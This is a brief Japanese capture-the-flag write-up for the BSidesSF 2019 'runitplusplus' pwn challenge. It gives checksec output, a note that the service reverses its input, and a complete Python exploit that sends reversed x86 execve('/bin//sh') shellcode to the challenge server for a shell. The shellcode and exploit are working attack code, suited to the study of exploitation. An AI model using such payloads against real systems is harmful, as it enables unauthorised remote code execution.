# [pwn 52pts] runitplusplus - BSidesSF 2019 CTF
```
$ checksec runitplusplus
emac[*] 'runitplusplus'
    Arch:       32 bits (little endian)
    NX:         NX enabled
    SSP:        SSP disabled (No canary found)
    RELRO:      Partial RELRO
    PIE:        PIE disabled
```
runitと同じ感じですが、IDAで解析すると送ったシェルコードに処理が施されていることが分かります。
処理を読むと、バッファを反転させていることが分かります。
したがって、送るシェルコードを逆にして送ってやればOKです。
```python
from ptrlib import *

shellcode  = b"\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += b"\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += b"\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode += b"\x90" * (0x400 - len(shellcode))
shellcode = shellcode[::-1]

sock = Socket("runitplusplus-a36bf652.challenges.bsidessf.net", 5353)
#sock = Socket("localhost", 5353)
#_ = input()

sock.send(shellcode)
sock.interactive()
```

# 感想
やるだけ問題ですね。